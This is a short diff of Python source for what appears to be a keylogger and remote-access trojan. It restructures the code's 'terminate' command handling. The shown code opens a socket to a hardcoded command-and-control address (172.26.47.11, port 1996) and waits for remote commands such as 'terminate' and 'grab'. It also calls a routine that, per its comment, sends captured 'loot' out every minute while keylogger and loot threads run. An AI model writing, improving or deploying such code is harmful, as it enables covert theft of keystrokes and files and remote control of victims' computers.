@@ -236,13 +236,6 @@ def emptyLoot():
     Timer(60.0, emptyLoot).start()      # Starts to send data every 1 minute
 
 
-def terminate(s, keyloggerThread, lootThread):
-    s.close()
-    keyloggerThread.join()
-    lootThread.join()
-    emptyLoot()         # To transfer files
-
-
 def connect(keyloggerThread, lootThread):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('172.26.47.11', 1996))
@@ -251,7 +244,10 @@ def connect(keyloggerThread, lootThread):
     while True:
         command = s.recv(1024)
         if 'terminate' in command:
-            terminate(s, keyloggerThread, lootThread)
+            s.close()
+            emptyLoot()             # For the leftover files
+            keyloggerThread.join()  # Stop the keylogger thread else it will consume resources in background
+            lootThread.join()       # Same is the case with Loot
             break
 
         elif 'grab' in command:
